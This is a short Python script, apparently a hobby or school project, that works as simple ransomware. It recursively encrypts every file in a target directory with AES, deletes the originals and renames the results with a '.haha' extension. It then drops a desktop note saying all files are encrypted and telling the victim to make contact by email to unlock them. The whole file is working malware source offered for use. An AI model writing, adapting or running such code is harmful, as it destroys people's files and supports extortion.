import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import random
import string

def pad(s):
    # Pad the given string to be a multiple of 16
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt_file(key, filename):
    iv = get_random_bytes(AES.block_size)
    # Create the AES cipher object with CBC mode
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(filename, "rb") as file:
        plaintext = file.read()
    padded_plaintext = pad(plaintext)
    ciphertext = cipher.encrypt(padded_plaintext)
    encrypted_filename = filename + ".haha"
    with open(encrypted_filename, "wb") as file:
        file.write(iv + ciphertext)
    os.remove(filename)
    os.rename(encrypted_filename, filename + ".haha")

def encrypt_directory(key, directory_path):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(key, file_path)

def generate_readable_key(length):
    characters = string.ascii_uppercase + string.digits
    key = ''.join(random.choice(characters) for _ in range(length))
    return key.encode()  # Convert the key to bytes

# Example usage:
directory_path = r"C:\Users\k\Desktop\school\random files"
  # Replace with the directory path you want to encrypt/decrypt
key = generate_readable_key(16)
# Encrypt files in the directory and its subdirectories
encrypt_directory(key, directory_path)

# Create a text file on the desktop containing the key
message = "All of your files have been encrypted. To unlock them, contact me with your encryption code at email@email.com."
key_info = f"Your encryption code is: {key.decode()}"
key_file_content = f"{message}\n\n{key_info}"

# Create a text file on the desktop containing the key
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
key_file_path = os.path.join(desktop_path, "encryption_key.txt")
with open(key_file_path, "w") as key_file:
    key_file.write(key_file_content)


